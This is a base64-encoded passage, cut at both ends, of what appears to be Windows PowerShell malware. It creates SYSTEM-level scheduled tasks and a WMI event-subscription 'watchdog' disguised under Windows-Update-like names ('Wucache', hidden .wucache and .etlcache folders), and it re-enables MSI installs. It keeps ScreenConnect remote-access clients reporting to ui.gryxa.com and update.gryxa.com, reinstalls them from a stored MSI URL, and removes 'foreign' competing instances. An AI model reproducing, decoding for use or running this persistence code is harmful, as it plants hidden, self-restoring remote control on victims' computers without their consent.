ZSB9CiAgICAgICAgJGJsb2IgPSBHZXQtVGFza1ZlcmJvc2VCbG9iICR0bgogICAgICAgIGlmICgt
bm90ICRibG9iKSB7ICRibG9iID0gR2V0LVRhc2tWZXJib3NlQmxvYiAoIlwkdG4iKSB9CiAgICAg
ICAgaWYgKCRibG9iKSB7CiAgICAgICAgICAgICRvdXJzQnJva2VuID0gKCRibG9iIC1tYXRjaCAn
KD9pKW93bl9tb25cLmNtZHxldGxfbW9uXC5jbWR8XC53dWNhY2hlXFx8XC5ldGxjYWNoZVxcJykK
ICAgICAgICAgICAgaWYgKC1ub3QgJG91cnNCcm9rZW4pIHsgJGZhaWwrKzsgV3JpdGUtT3duTG9n
ICJ0YXNrc19za2lwX2ZvcmVpZ24gJHRuIjsgY29udGludWUgfQogICAgICAgICAgICBSZW1vdmUt
VGFza1F1aWV0ICR0bgogICAgICAgICAgICBSZW1vdmUtVGFza1F1aWV0ICgiXCR0biIpCiAgICAg
ICAgfQogICAgICAgICMgQnVpbGQgY21kbGluZSBleGFjdGx5IGxpa2Ugb3duLmNtZCBkZXRhY2gg
KHByb3ZlbiB0byB3b3JrIGFzIFNZU1RFTSkuCiAgICAgICAgJHBhcnRzID0gQCgKICAgICAgICAg
ICAgJy9DcmVhdGUnLCAnL1ROJywgJHRuLCAnL1JVJywgJ1NZU1RFTScsICcvUkwnLCAnSElHSEVT
VCcsICcvRicsCiAgICAgICAgICAgICcvVFInLCAkc3AuVHIsICcvU0MnLCAkc3AuU2MKICAgICAg
ICApCiAgICAgICAgaWYgKCRzcC5TYyAtZXEgJ01JTlVURScpIHsKICAgICAgICAgICAgJHBhcnRz
ICs9IEAoJy9NTycsICRzcC5NbywgJy9TVCcsICRzdCkKICAgICAgICB9CiAgICAgICAgJGFyZ0xp
bmUgPSAoJHBhcnRzIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICBpZiAoJF8gLW1hdGNo
ICdbXHMiXScpIHsgJyJ7MH0iJyAtZiAoJF8gLXJlcGxhY2UgJyInLCAnXCInKSB9IGVsc2UgeyAk
XyB9CiAgICAgICAgfSkgLWpvaW4gJyAnCiAgICAgICAgJGNyZWF0ZVR4dCA9IGNtZC5leGUgL2Mg
InNjaHRhc2tzLmV4ZSAkYXJnTGluZSIgMj4mMSB8IEZvckVhY2gtT2JqZWN0IHsgIiRfIiB9CiAg
ICAgICAgJGNyZWF0ZUpvaW5lZCA9ICgkY3JlYXRlVHh0IC1qb2luICcgJykuVHJpbSgpCiAgICAg
ICAgV3JpdGUtT3duTG9nICJ0YXNrc19jcmVhdGUgJCgkc3AuS2V5KSAkdG4gPT4gJGNyZWF0ZUpv
aW5lZCIKICAgICAgICBpZiAoKFRlc3QtVGFza093bnNNb24gJHRuICRzcC5NYXJrZXIpIC1vciAo
VGVzdC1UYXNrT3duc01vbiAoIlwkdG4iKSAkc3AuTWFya2VyKSkgewogICAgICAgICAgICAkcmVh
cm1lZCsrCiAgICAgICAgICAgIGlmICgkc3AuS2V5IC1lcSAnVEFTS19BJyAtb3IgJHNwLktleSAt
ZXEgJ1RBU0tfQicpIHsKICAgICAgICAgICAgICAgIGNtZC5leGUgL2MgInNjaHRhc2tzLmV4ZSAv
UnVuIC9UTiBgIiR0bmAiIiB8IE91dC1OdWxsCiAgICAgICAgICAgIH0KICAgICAgICB9IGVsc2Ug
ewogICAgICAgICAgICAkZmFpbCsrCiAgICAgICAgICAgIFdyaXRlLU93bkxvZyAidGFza3NfY3Jl
YXRlX0ZBSUwgJCgkc3AuS2V5KSAkdG4iCiAgICAgICAgfQogICAgfQogICAgcmV0dXJuICJ0YXNr
cyBvaz0kb2sgcmVhcm1lZD0kcmVhcm1lZCBmYWlsPSRmYWlsIgp9CgpmdW5jdGlvbiBSZW1vdmUt
V2F0Y2hkb2cgewogICAgZm9yZWFjaCAoJGNscyBpbiBAKCdfX0ZpbHRlclRvQ29uc3VtZXJCaW5k
aW5nJywnX19FdmVudEZpbHRlcicsJ0NvbW1hbmRMaW5lRXZlbnRDb25zdW1lcicsJ19fSW50ZXJ2
YWxUaW1lckluc3RydWN0aW9uJykpIHsKICAgICAgICBHZXQtV21pT2JqZWN0IC1OYW1lc3BhY2Ug
cm9vdFxzdWJzY3JpcHRpb24gLUNsYXNzICRjbHMgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGlu
dWUgfAogICAgICAgICAgICBXaGVyZS1PYmplY3QgewogICAgICAgICAgICAgICAgKCRfLk5hbWUg
LWVxICdXdWNhY2hlV2F0Y2hkb2dGJykgLW9yICgkXy5OYW1lIC1lcSAnV3VjYWNoZVdhdGNoZG9n
QycpIC1vcgogICAgICAgICAgICAgICAgKCRfLlRpbWVySWQgLWVxICdXdWNhY2hlV2F0Y2hkb2cn
KSAtb3IKICAgICAgICAgICAgICAgICgkXy5GaWx0ZXIgLWFuZCAkXy5GaWx0ZXIuVG9TdHJpbmco
KSAtbGlrZSAnKld1Y2FjaGVXYXRjaGRvZ0YqJykgLW9yCiAgICAgICAgICAgICAgICAoJF8uQ29u
c3VtZXIgLWFuZCAkXy5Db25zdW1lci5Ub1N0cmluZygpIC1saWtlICcqV3VjYWNoZVdhdGNoZG9n
QyonKQogICAgICAgICAgICB9IHwgRm9yRWFjaC1PYmplY3QgeyAkXy5EZWxldGUoKSB8IE91dC1O
dWxsIH0KICAgIH0KfQoKZnVuY3Rpb24gSW5zdGFsbC1XYXRjaGRvZyB7CiAgICBpZiAoLW5vdCAk
TW9uUGF0aCkgeyByZXR1cm4gJGZhbHNlIH0KICAgIFJlbW92ZS1XYXRjaGRvZwogICAgJG9rID0g
JHRydWUKICAgIHRyeSB7CiAgICAgICAgU2V0LVdtaUluc3RhbmNlIC1OYW1lc3BhY2Ugcm9vdFxz
dWJzY3JpcHRpb24gLUNsYXNzIF9fSW50ZXJ2YWxUaW1lckluc3RydWN0aW9uIGAKICAgICAgICAg
ICAgLUFyZ3VtZW50cyBAeyBUaW1lcklkID0gJ1d1Y2FjaGVXYXRjaGRvZyc7IEludGVydmFsTWls
bGlzZWNvbmRzID0gMTgwMDAwOyBTa2lwSWZQYXNzZWQgPSAkZmFsc2UgfSB8IE91dC1OdWxsCiAg
ICAgICAgJGYgPSBTZXQtV21pSW5zdGFuY2UgLU5hbWVzcGFjZSByb290XHN1YnNjcmlwdGlvbiAt
Q2xhc3MgX19FdmVudEZpbHRlciBgCiAgICAgICAgICAgIC1Bcmd1bWVudHMgQHsgTmFtZSA9ICdX
dWNhY2hlV2F0Y2hkb2dGJzsgRXZlbnROYW1lc3BhY2UgPSAncm9vdFxjaW12Mic7IFF1ZXJ5TGFu
Z3VhZ2UgPSAnV1FMJzsKICAgICAgICAgICAgICAgICAgICAgICAgICBRdWVyeSA9ICJTRUxFQ1Qg
KiBGUk9NIF9fVGltZXJFdmVudCBXSEVSRSBUaW1lcklkPSdXdWNhY2hlV2F0Y2hkb2cnIiB9CiAg
ICAgICAgJGMgPSBTZXQtV21pSW5zdGFuY2UgLU5hbWVzcGFjZSByb290XHN1YnNjcmlwdGlvbiAt
Q2xhc3MgQ29tbWFuZExpbmVFdmVudENvbnN1bWVyIGAKICAgICAgICAgICAgLUFyZ3VtZW50cyBA
eyBOYW1lID0gJ1d1Y2FjaGVXYXRjaGRvZ0MnOyBDb21tYW5kTGluZVRlbXBsYXRlID0gImNtZC5l
eGUgL2MgYCIkTW9uUGF0aGAiIjsgUnVuSW50ZXJhY3RpdmVseSA9ICRmYWxzZSB9CiAgICAgICAg
U2V0LVdtaUluc3RhbmNlIC1OYW1lc3BhY2Ugcm9vdFxzdWJzY3JpcHRpb24gLUNsYXNzIF9fRmls
dGVyVG9Db25zdW1lckJpbmRpbmcgYAogICAgICAgICAgICAtQXJndW1lbnRzIEB7IEZpbHRlciA9
ICRmOyBDb25zdW1lciA9ICRjIH0gfCBPdXQtTnVsbAogICAgfSBjYXRjaCB7ICRvayA9ICRmYWxz
ZSB9CiAgICByZXR1cm4gJG9rCn0KCmZ1bmN0aW9uIFRlc3QtV2F0Y2hkb2dHcmFwaCB7CiAgICAk
dCA9IEdldC1XbWlPYmplY3QgLU5hbWVzcGFjZSByb290XHN1YnNjcmlwdGlvbiAtQ2xhc3MgX19J
bnRlcnZhbFRpbWVySW5zdHJ1Y3Rpb24gLUZpbHRlciAiVGltZXJJZD0nV3VjYWNoZVdhdGNoZG9n
JyIgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKICAgICRmID0gR2V0LVdtaU9iamVjdCAt
TmFtZXNwYWNlIHJvb3Rcc3Vic2NyaXB0aW9uIC1DbGFzcyBfX0V2ZW50RmlsdGVyIC1GaWx0ZXIg
Ik5hbWU9J1d1Y2FjaGVXYXRjaGRvZ0YnIiAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQog
ICAgJGMgPSBHZXQtV21pT2JqZWN0IC1OYW1lc3BhY2Ugcm9vdFxzdWJzY3JpcHRpb24gLUNsYXNz
IENvbW1hbmRMaW5lRXZlbnRDb25zdW1lciAtRmlsdGVyICJOYW1lPSdXdWNhY2hlV2F0Y2hkb2dD
JyIgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKICAgICRiID0gJG51bGwKICAgIGlmICgk
ZiAtYW5kICRjKSB7CiAgICAgICAgJGIgPSBHZXQtV21pT2JqZWN0IC1OYW1lc3BhY2Ugcm9vdFxz
dWJzY3JpcHRpb24gLUNsYXNzIF9fRmlsdGVyVG9Db25zdW1lckJpbmRpbmcgLUVycm9yQWN0aW9u
IFNpbGVudGx5Q29udGludWUgfAogICAgICAgICAgICBXaGVyZS1PYmplY3QgeyAkXy5GaWx0ZXIg
LWxpa2UgJypXdWNhY2hlV2F0Y2hkb2dGKicgLWFuZCAkXy5Db25zdW1lciAtbGlrZSAnKld1Y2Fj
aGVXYXRjaGRvZ0MqJyB9IHwKICAgICAgICAgICAgU2VsZWN0LU9iamVjdCAtRmlyc3QgMQogICAg
fQogICAgcmV0dXJuIFtib29sXSgkdCAtYW5kICRmIC1hbmQgJGMgLWFuZCAkYikKfQoKZnVuY3Rp
b24gRW5zdXJlLVdhdGNoZG9nIHsKICAgIGlmIChUZXN0LVdhdGNoZG9nR3JhcGgpIHsgcmV0dXJu
ICdPSycgfQogICAgaWYgKC1ub3QgJE1vblBhdGgpIHsgcmV0dXJuICdNSVNTSU5HJyB9CiAgICBp
ZiAoSW5zdGFsbC1XYXRjaGRvZykgeyByZXR1cm4gJ1JFQVJNRUQnIH0KICAgIHJldHVybiAnRkFJ
TCcKfQoKIyBDb3JyZWN0IDMyLWJpdCArIDY0LWJpdCBBUlAgaGl2ZXMuIEw2IGFuZCBlYXJsaWVy
IHVzZWQgYSB0cnVuY2F0ZWQKIyBXT1c2NDMyTm9kZSBwYXRoIChtaXNzaW5nIE1pY3Jvc29mdFxX
aW5kb3dzKSBzbyBFVkVSWSAzMi1iaXQgU0MgcHJvZHVjdAojIHdhcyBpbnZpc2libGUgdG8gcmVw
YWlyL2V4dGVybWluYXRlL3JlZ2lzdGVyZWQuCiRzY3JpcHQ6VW5pbnN0YWxsUm9vdHMgPSBAKAog
ICAgJ0hLTE06XFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFVuaW5z
dGFsbCcsCiAgICAnSEtMTTpcU09GVFdBUkVcV09XNjQzMk5vZGVcTWljcm9zb2Z0XFdpbmRvd3Nc
Q3VycmVudFZlcnNpb25cVW5pbnN0YWxsJwopCgpmdW5jdGlvbiBUZXN0LVNDUmVnaXN0ZXJlZChb
c3RyaW5nXSRGaW5nZXJwcmludCkgewogICAgIyBMODogTkVWRVIgdXNlIHJldHVybiBpbnNpZGUg
Rm9yRWFjaC1PYmplY3QgLSBpdCBvbmx5IGV4aXRzIHRoZQogICAgIyBwaXBlbGluZSBpdGVyYXRp
b24sIHNvIHRoaXMgZnVuY3Rpb24gYWx3YXlzIGZlbGwgdGhyb3VnaCB0byAnbm8nCiAgICAjIGFu
ZCB0aGUgbW9uIG9ycGhhbi1sYWRkZXIgZGVsZXRlZCBoZWFsdGh5IHJlZ2lzdGVyZWQgc2Vydmlj
ZXMuCiAgICBpZiAoLW5vdCAkRmluZ2VycHJpbnQpIHsgcmV0dXJuICdubycgfQogICAgJG5hbWUg
PSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCRGaW5nZXJwcmludCkiCiAgICBmb3JlYWNoICgkcm9v
dCBpbiAkc2NyaXB0OlVuaW5zdGFsbFJvb3RzKSB7CiAgICAgICAgaWYgKC1ub3QgKFRlc3QtUGF0
aCAkcm9vdCkpIHsgY29udGludWUgfQogICAgICAgIGZvcmVhY2ggKCRrZXkgaW4gKEdldC1DaGls
ZEl0ZW0gJHJvb3QgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUpKSB7CiAgICAgICAgICAg
ICRkbiA9IChHZXQtSXRlbVByb3BlcnR5ICRrZXkuUFNQYXRoIC1FcnJvckFjdGlvbiBTaWxlbnRs
eUNvbnRpbnVlKS5EaXNwbGF5TmFtZQogICAgICAgICAgICBpZiAoJGRuIC1hbmQgKCRkbiAtaWVx
ICRuYW1lKSAtYW5kICgka2V5LlBTQ2hpbGROYW1lIC1saWtlICd7Kn0nKSkgeyByZXR1cm4gJ3ll
cycgfQogICAgICAgIH0KICAgIH0KICAgIHJldHVybiAnbm8nCn0KCmZ1bmN0aW9uIFJlcGFpci1T
Q1NlcnZpY2UoW3N0cmluZ10kRmluZ2VycHJpbnQpIHsKICAgICMgUmVjcmVhdGVzIGEgZGVsZXRl
ZCBTQyBzZXJ2aWNlIGVudHJ5IGJ5IHJlcGFpcmluZyB0aGUgUkVHSVNURVJFRCBwcm9kdWN0Lgog
ICAgIyBtc2lleGVjIC9mYSB7R1VJRH0gcmVwYWlycyBpbiBwbGFjZSAtIGl0IGRvZXMgTk9UIHJ1
biB0aGUgU0MtZmFtaWx5CiAgICAjIG1ham9yLXVwZ3JhZGUgcmVtb3ZhbCwgc28gb3RoZXIgaW5z
dGFuY2VzIGFyZSB1bnRvdWNoZWQuCiAgICAjIEw1OiBhbHNvIGhhbmRsZXMgcHJlc2VudC1idXQt
U1RPUFBFRCBzZXJ2aWNlcyAocmVwYWlyIHJlc3RvcmVzIGJpbmFyaWVzLAogICAgIyB0aGVuIHN0
YXJ0KS4gT25seSBhIFJ1bm5pbmcgc2VydmljZSBpcyBjb25zaWRlcmVkIGhlYWx0aHkuCiAgICBp
ZiAoLW5vdCAkRmluZ2VycHJpbnQpIHsgcmV0dXJuICduby1mcCcgfQogICAgJG5hbWUgPSAiU2Ny
ZWVuQ29ubmVjdCBDbGllbnQgKCRGaW5nZXJwcmludCkiCiAgICAkc3ZjID0gR2V0LVNlcnZpY2Ug
LU5hbWUgJG5hbWUgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKICAgIGlmICgkc3ZjIC1h
bmQgJHN2Yy5TdGF0dXMgLWVxICdSdW5uaW5nJykgeyByZXR1cm4gJ3N2Yy1ydW5uaW5nJyB9CiAg
ICAkZ3VpZCA9ICRudWxsCiAgICBmb3JlYWNoICgkcm9vdCBpbiAkc2NyaXB0OlVuaW5zdGFsbFJv
b3RzKSB7CiAgICAgICAgaWYgKC1ub3QgKFRlc3QtUGF0aCAkcm9vdCkpIHsgY29udGludWUgfQog
ICAgICAgIGZvcmVhY2ggKCRrZXkgaW4gKEdldC1DaGlsZEl0ZW0gJHJvb3QgLUVycm9yQWN0aW9u
IFNpbGVudGx5Q29udGludWUpKSB7CiAgICAgICAgICAgICRkbiA9IChHZXQtSXRlbVByb3BlcnR5
ICRrZXkuUFNQYXRoIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlKS5EaXNwbGF5TmFtZQog
ICAgICAgICAgICBpZiAoJGRuIC1hbmQgKCRkbiAtaWVxICRuYW1lKSAtYW5kICgka2V5LlBTQ2hp
bGROYW1lIC1saWtlICd7Kn0nKSkgeyAkZ3VpZCA9ICRrZXkuUFNDaGlsZE5hbWU7IGJyZWFrIH0K
ICAgICAgICB9CiAgICAgICAgaWYgKCRndWlkKSB7IGJyZWFrIH0KICAgIH0KICAgIGlmICgtbm90
ICRndWlkKSB7IHJldHVybiAnbm90LXJlZ2lzdGVyZWQnIH0KICAgICYgcmVnLmV4ZSBkZWxldGUg
J0hLTE1cU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3NcSW5zdGFsbGVyJyAvdiBE
aXNhYmxlTVNJIC9mIDI+JjEgfCBPdXQtTnVsbAogICAgJiByZWcuZXhlIGFkZCAnSEtMTVxTT0ZU
V0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93c1xJbnN0YWxsZXInIC92IERpc2FibGVNU0kg
L3QgUkVHX0RXT1JEIC9kIDAgL2YgMj4mMSB8IE91dC1OdWxsCiAgICAkbG9nID0gSm9pbi1QYXRo
ICRXb3JrRGlyICJtc2lfcmVwYWlyXyRGaW5nZXJwcmludC5sb2ciCiAgICAkcCA9IFN0YXJ0LVBy
b2Nlc3MgbXNpZXhlYy5leGUgLUFyZ3VtZW50TGlzdCAiL2ZhICRndWlkIC9xbiAvbm9yZXN0YXJ0
IC9MKnYgYCIkbG9nYCIiIC1XYWl0IC1QYXNzVGhydQogICAgU3RhcnQtU2xlZXAgLVNlY29uZHMg
OAogICAgJiBzYy5leGUgY29uZmlnICIkbmFtZSIgc3RhcnQ9IGF1dG8gMj4mMSB8IE91dC1OdWxs
CiAgICAmIHNjLmV4ZSBzdGFydCAiJG5hbWUiIDI+JjEgfCBPdXQtTnVsbAogICAgU3RhcnQtU2xl
ZXAgLVNlY29uZHMgNAogICAgJHN2YyA9IEdldC1TZXJ2aWNlIC1OYW1lICRuYW1lIC1FcnJvckFj
dGlvbiBTaWxlbnRseUNvbnRpbnVlCiAgICBpZiAoJHN2YyAtYW5kICRzdmMuU3RhdHVzIC1lcSAn
UnVubmluZycpIHsgcmV0dXJuICJzdmMtcmVzdG9yZWQgZXhpdD0kKCRwLkV4aXRDb2RlKSIgfQog
ICAgaWYgKCRzdmMpIHsgcmV0dXJuICJzdmMtc3RpbGwtc3RvcHBlZCBleGl0PSQoJHAuRXhpdENv
ZGUpIiB9CiAgICByZXR1cm4gInN2Yy1zdGlsbC1taXNzaW5nIGV4aXQ9JCgkcC5FeGl0Q29kZSki
Cn0KCiMg4pSA4pSAIEdyeXhhIE1VU1QtUlVOIGhlYWx0aCAoTDE2KSDilIDilIDilIDilIDilIDi
lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi
lIDilIDilIDilIDilIDilIDilIDilIDilIAKIyBMMTY6IE5FVkVSIHJlaW5zdGFsbCB3aGVuIHNl
cnZpY2UgaXMgUnVubmluZyAocGFuZWwgZHVwbGljYXRlcykuCiMgICAgICBUQ1AvcmVsYXkgYXJl
IGFkdmlzb3J5IG9ubHkuIFJlaW5zdGFsbCBvbmx5OiBtaXNzaW5nL3N0b3BwZWQgT1IgRlAgZHJp
ZnQgT1IgLUZvcmNlLgojIEwxNTogZ3J5eGEtaGVhbHRoIC8gZ3J5eGEtZW5zdXJlIOKAlCA4aCBk
ZWVwIGNoZWNrIChUQ1AvcmVsYXkvRlAgZHJpZnQgcmVpbnN0YWxsKS4KJHNjcmlwdDpHcnl4YURl
ZmF1bHRGcCA9ICc5OTA4MTk4ZTY2OGU0NzUwJwokc2NyaXB0OkdyeXhhTXNpVXJsID0gJ2h0dHBz
Oi8vdWkuZ3J5eGEuY29tL0Jpbi9TY3JlZW5Db25uZWN0LkNsaWVudFNldHVwLm1zaT9lPUFjY2Vz
cyZ5PUd1ZXN0Jwokc2NyaXB0OkdyeXhhUmVsYXlIb3N0ID0gJ3VwZGF0ZS5ncnl4YS5jb20nCiRz
Y3JpcHQ6R3J5eGFVaUhvc3QgPSAndWkuZ3J5eGEuY29tJwokc2NyaXB0OlNldnJ6S2VlcCA9IEAo
JzVmNjAxMDU3OTg1MmU1MDcnLCAnZjg2MWM4MTQwZDQ1MzQyNycpCgpmdW5jdGlvbiBHZXQtR3J5
eGFDZmdQYXRoIHsgSm9pbi1QYXRoICRXb3JrRGlyICdncnl4YS5jZmcnIH0KCmZ1bmN0aW9uIEdl
dC1Hcnl4YUZwIHsKICAgICRmcCA9ICRzY3JpcHQ6R3J5eGFEZWZhdWx0RnAKICAgICRwID0gR2V0
LUdyeXhhQ2ZnUGF0aAogICAgaWYgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJHApIHsKICAgICAg
ICBHZXQtQ29udGVudCAtTGl0ZXJhbFBhdGggJHAgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGlu
dWUgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgIGlmICgkXyAtbWF0Y2ggJ15DVVJSRU5U
X0ZQPShbMC05YS1mQS1GXXsxNn0pXHMqJCcpIHsgJGZwID0gJG1hdGNoZXNbMV0uVG9Mb3dlcigp
IH0KICAgICAgICB9CiAgICB9CiAgICByZXR1cm4gJGZwCn0KCmZ1bmN0aW9uIFNldC1Hcnl4YUZw
KFtzdHJpbmddJEZpbmdlcnByaW50KSB7CiAgICBpZiAoLW5vdCAkRmluZ2VycHJpbnQpIHsgcmV0
dXJuIH0KICAgIGlmICgtbm90IChUZXN0LVBhdGggLUxpdGVyYWxQYXRoICRXb3JrRGlyKSkgewog
ICAgICAgIE5ldy1JdGVtIC1JdGVtVHlwZSBEaXJlY3RvcnkgLVBhdGggJFdvcmtEaXIgLUZvcmNl
IHwgT3V0LU51bGwKICAgIH0KICAgIEAoCiAgICAgICAgIkNVUlJFTlRfRlA9JCgkRmluZ2VycHJp
bnQuVG9Mb3dlcigpKSIKICAgICAgICAiUkVMQVk9JCgkc2NyaXB0OkdyeXhhUmVsYXlIb3N0KSIK
ICAgICAgICAiVUk9JCgkc2NyaXB0OkdyeXhhVWlIb3N0KSIKICAgICAgICAiTVNJVVJMPSQoJHNj
cmlwdDpHcnl4YU1zaVVybCkiCiAgICAgICAgIlVQREFURUQ9JCgoR2V0LURhdGUpLlRvVW5pdmVy
c2FsVGltZSgpLlRvU3RyaW5nKCdvJykpIgogICAgKSB8IFNldC1Db250ZW50IC1MaXRlcmFsUGF0
aCAoR2V0LUdyeXhhQ2ZnUGF0aCkgLUVuY29kaW5nIEFTQ0lJIC1Gb3JjZQp9CgpmdW5jdGlvbiBH
ZXQtS2VlcEZpbmdlcnByaW50cyB7CiAgICAkc2V0ID0gTmV3LU9iamVjdCAnU3lzdGVtLkNvbGxl
Y3Rpb25zLkdlbmVyaWMuSGFzaFNldFtzdHJpbmddJyAoW1N0cmluZ0NvbXBhcmVyXTo6T3JkaW5h
bElnbm9yZUNhc2UpCiAgICBbdm9pZF0kc2V0LkFkZCgnNWY2MDEwNTc5ODUyZTUwNycpCiAgICBb
dm9pZF0kc2V0LkFkZCgnZjg2MWM4MTQwZDQ1MzQyNycpCiAgICBbdm9pZF0kc2V0LkFkZCgoR2V0
LUdyeXhhRnApKQogICAgIyBPNDE6IGFueSBsaXZlL3N0YXJ0aW5nIG5vbi1zZXZyeiBTQyBpcyBh
IGtlZXBlciAobmV2ZXIgZXh0ZXJtaW5hdGUgYXMgZm9yZWlnbikKICAgIGZvcmVhY2ggKCRzdmMg
aW4gKEdldC1TZXJ2aWNlIC1OYW1lICdTY3JlZW5Db25uZWN0IENsaWVudConIC1FcnJvckFjdGlv
biBTaWxlbnRseUNvbnRpbnVlKSkgewogICAgICAgIGlmICgkc3ZjLlN0YXR1cyAtbm90aW4gQCgn
UnVubmluZycsICdTdGFydFBlbmRpbmcnLCAnQ29udGludWVQZW5kaW5nJykpIHsgY29udGludWUg
fQogICAgICAgIGlmICgkc3ZjLk5hbWUgLW1hdGNoICdcKChbMC05YS1mXXsxNn0pXCknKSB7CiAg
ICAgICAgICAgICRmcCA9ICRtYXRjaGVzWzFdLlRvTG93ZXIoKQogICAgICAgICAgICBpZiAoJGZw
IC1ub3RpbiAkc2NyaXB0OlNldnJ6S2VlcCkgewogICAgICAgICAgICAgICAgW3ZvaWRdJHNldC5B
ZGQoJGZwKQogICAgICAgICAgICAgICAgU2V0LUdyeXhhRnAgJGZwCiAgICAgICAgICAgIH0KICAg
ICAgICB9CiAgICB9CiAgICByZXR1cm4gQCgkc2V0KQp9CgpmdW5jdGlvbiBUZXN0LVRjcEhvc3RQ
b3J0KFtzdHJpbmddJEhvc3ROYW1lLCBbaW50XSRQb3J0ID0gNDQzLCBbaW50XSRUaW1lb3V0TXMg
PSA4MDAwKSB7CiAgICBpZiAoLW5vdCAkSG9zdE5hbWUpIHsgcmV0dXJuICRmYWxzZSB9CiAgICAk
Y2xpZW50ID0gJG51bGwKICAgIHRyeSB7CiAgICAgICAgJGNsaWVudCA9IE5ldy1PYmplY3QgU3lz
dGVtLk5ldC5Tb2NrZXRzLlRjcENsaWVudAogICAgICAgICRpYXIgPSAkY2xpZW50LkJlZ2luQ29u
bmVjdCgkSG9zdE5hbWUsICRQb3J0LCAkbnVsbCwgJG51bGwpCiAgICAgICAgaWYgKC1ub3QgJGlh
ci5Bc3luY1dhaXRIYW5kbGUuV2FpdE9uZSgkVGltZW91dE1zLCAkZmFsc2UpKSB7CiAgICAgICAg
ICAgIHRyeSB7ICRjbGllbnQuQ2xvc2UoKSB9IGNhdGNoIHt9CiAgICAgICAgICAgIHJldHVybiAk
ZmFsc2UKICAgICAgICB9CiAgICAgICAgJGNsaWVudC5FbmRDb25uZWN0KCRpYXIpCiAgICAgICAg
cmV0dXJuICR0cnVlCiAgICB9IGNhdGNoIHsKICAgICAgICByZXR1cm4gJGZhbHNlCiAgICB9IGZp
bmFsbHkgewogICAgICAgIGlmICgkY2xpZW50KSB7IHRyeSB7ICRjbGllbnQuQ2xvc2UoKSB9IGNh
dGNoIHt9IH0KICAgIH0KfQoKZnVuY3Rpb24gR2V0LU1zaVByb3BlcnR5KFtzdHJpbmddJE1zaVBh
dGgsIFtzdHJpbmddJFByb3BlcnR5TmFtZSkgewogICAgaWYgKC1ub3QgKFRlc3QtUGF0aCAtTGl0
ZXJhbFBhdGggJE1zaVBhdGgpKSB7IHJldHVybiAkbnVsbCB9CiAgICB0cnkgewogICAgICAgICRp
bnN0YWxsZXIgPSBOZXctT2JqZWN0IC1Db21PYmplY3QgV2luZG93c0luc3RhbGxlci5JbnN0YWxs
ZXIKICAgICAgICAkZGIgPSAkaW5zdGFsbGVyLk9wZW5EYXRhYmFzZSgoUmVzb2x2ZS1QYXRoIC1M
aXRlcmFsUGF0aCAkTXNpUGF0aCkuUGF0aCwgMCkKICAgICAgICAkdmlldyA9ICRkYi5PcGVuVmll
dygiU0VMRUNUIGBWYWx1ZWAgRlJPTSBgUHJvcGVydHlgIFdIRVJFIGBQcm9wZXJ0eWA9JyRQcm9w
ZXJ0eU5hbWUnIikKICAgICAgICAkdmlldy5FeGVjdXRlKCkgfCBPdXQtTnVsbAogICAgICAgICRy
ZWMgPSAkdmlldy5GZXRjaCgpCiAgICAgICAgaWYgKC1ub3QgJHJlYykgeyByZXR1cm4gJG51bGwg
fQogICAgICAgIHJldHVybiBbc3RyaW5nXSRyZWMuU3RyaW5nRGF0YSgxKQogICAgfSBjYXRjaCB7
CiAgICAgICAgcmV0dXJuICRudWxsCiAgICB9Cn0KCmZ1bmN0aW9uIEdldC1GcEZyb21Qcm9kdWN0
TmFtZShbc3RyaW5nXSRQcm9kdWN0TmFtZSkgewogICAgaWYgKCRQcm9kdWN0TmFtZSAtbWF0Y2gg
J1woKFswLTlhLWZBLUZdezE2fSlcKScpIHsgcmV0dXJuICRtYXRjaGVzWzFdLlRvTG93ZXIoKSB9
CiAgICByZXR1cm4gJG51bGwKfQoKZnVuY3Rpb24gRmluZC1Qcm9kdWN0R3VpZChbc3RyaW5nXSRG
aW5nZXJwcmludCkgewogICAgJG5hbWUgPSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCRGaW5nZXJw
cmludCkiCiAgICBmb3JlYWNoICgkcm9vdCBpbiAkc2NyaXB0OlVuaW5zdGFsbFJvb3RzKSB7CiAg
ICAgICAgaWYgKC1ub3QgKFRlc3QtUGF0aCAkcm9vdCkpIHsgY29udGludWUgfQogICAgICAgIGZv
cmVhY2ggKCRrZXkgaW4gKEdldC1DaGlsZEl0ZW0gJHJvb3QgLUVycm9yQWN0aW9uIFNpbGVudGx5
Q29udGludWUpKSB7CiAgICAgICAgICAgICRkbiA9IChHZXQtSXRlbVByb3BlcnR5ICRrZXkuUFNQ
YXRoIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlKS5EaXNwbGF5TmFtZQogICAgICAgICAg
ICBpZiAoJGRuIC1hbmQgKCRkbiAtaWVxICRuYW1lKSAtYW5kICgka2V5LlBTQ2hpbGROYW1lIC1s
aWtlICd7Kn0nKSkgewogICAgICAgICAgICAgICAgcmV0dXJuICRrZXkuUFNDaGlsZE5hbWUKICAg
ICAgICAgICAgfQogICAgICAgIH0KICAgIH0KICAgIHJldHVybiAkbnVsbAp9CgpmdW5jdGlvbiBU
ZXN0LUdyeXhhUmVsYXlDb25maWd1cmVkKFtzdHJpbmddJEZpbmdlcnByaW50KSB7CiAgICAkbmFt
ZSA9ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJEZpbmdlcnByaW50KSIKICAgICRkaXJzID0gQCgK
ICAgICAgICAoSm9pbi1QYXRoICR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfSAiU2NyZWVuQ29ubmVj
